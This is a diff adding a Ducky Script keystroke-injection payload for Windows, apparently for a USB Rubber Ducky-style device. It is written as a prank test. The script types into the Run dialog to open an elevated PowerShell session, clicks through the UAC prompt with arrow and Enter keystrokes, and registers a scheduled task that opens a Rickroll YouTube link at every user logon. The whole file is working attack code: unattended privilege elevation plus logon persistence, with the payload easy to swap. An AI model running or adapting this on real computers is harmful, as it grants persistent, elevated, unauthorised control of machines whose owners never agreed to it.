@@ -1,0 +1,31 @@
+REM Title: Powershell Task Test
+REM Author: Caleb Friedman
+REM Description: Open powershell with system administrator privileges and create task which opens a youtube video whenever a user logs on 
+REM Target: Windows
+
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+CONTROL SHIFT ENTER
+
+DELAY 500
+LEFTARROW
+DELAY 500
+ENTER
+
+DELAY 500
+STRING $action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'start chrome https://youtu.be/dQw4w9WgXcQ -WindowStyle maximized' 
+ENTER
+DELAY 500
+STRING $trigger = New-ScheduledTaskTrigger -AtLogon
+ENTER
+DELAY 500
+STRING $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries
+ENTER
+DELAY 500
+STRING Register-ScheduledTask -Settings $settings -Action $action -Trigger $trigger -TaskPath "My tasks" -TaskName "Powershell Open at Logon" -Description "Test 1"
+ENTER
+DELAY 300
+STRING exit
+ENTER
